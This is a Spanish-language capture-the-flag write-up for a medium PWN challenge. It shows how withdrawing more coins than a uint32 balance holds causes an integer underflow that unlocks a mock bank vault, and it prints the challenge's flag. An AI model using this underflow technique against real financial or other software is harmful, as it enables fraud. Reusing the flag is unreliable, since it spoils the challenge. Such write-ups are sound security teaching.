# Coduct

[Español](README.md) | [English](README.en.md)

**Reto 6 · PWN · Dificultad: Medio**

## Reto

>Coduct Bank ha lanzado recientemente un nuevo terminal bancario interno para probar su sistema de transacciones de última generación. La aplicación permite a los empleados depositar y retirar monedas virtuales antes de canjear recompensas de una cámara acorazada segura. Según los desarrolladores, solo las cuentas que tengan al menos un millón de monedas pueden acceder a la cámara acorazada y recuperar activos confidenciales de la empresa.
>
>Durante una evaluación de seguridad rutinaria, tu equipo observó que el sistema almacena los saldos como enteros de 32 bits sin signo. Al revisar la lógica de las transacciones, descubriste que las retiradas se procesan antes de que se produzca cualquier validación. Un error aritmético aparentemente inofensivo podría permitir que los saldos se desbordaran y alcanzaran valores enormes. Tu objetivo es explotar el fallo, desbloquear la cámara acorazada y recuperar el indicador protegido.

## Flag

```text
1nt3g3r_und3rfl0w_g0n3_n1c3
```

## Resolución

Se accede al terminal con Netcat:

```bash
nc challenges2.hackrocks.com 6717
```

Al establecer la conexión aparece el siguiente menú:

```text
1. Check Balance
2. Deposit Coins
3. Withdraw Coins
4. Check Vault
5. Show Challenge Info
0. Exit
```

La opción `5` (**Show Challenge Info**) indica que el saldo inicial es de **100 monedas**, que se utiliza `uint32` y que falta una comprobación antes de restar. También deja la pista: ¿qué ocurre al calcular `0 - 1` como `uint32_t`?

Se consulta el saldo con la opción `1` (**Check Balance**) y se selecciona `3` (**Withdraw Coins**) para retirar una moneda más de las disponibles. El programa procesa la resta sin impedir que el saldo quede por debajo de cero, provocando un **Integer Underflow**.

Desde el saldo inicial de 100 monedas, retirar 101 produce `100 - 101 = -1`, que pasa a `4294967295` en un `uint32`.

```text
coduct-bank > 3
Withdraw amount: 101

[+] Withdrew 101 coins. Balance: 4294967295
```

Con el saldo por encima del millón requerido, se selecciona `4` (**Check Vault**):

```text
coduct-bank > 4

[!!!] VAULT UNLOCKED
Balance: 4,294,967,295 coins

[!!!] FLAG: 1nt3g3r_und3rfl0w_g0n3_n1c3
```
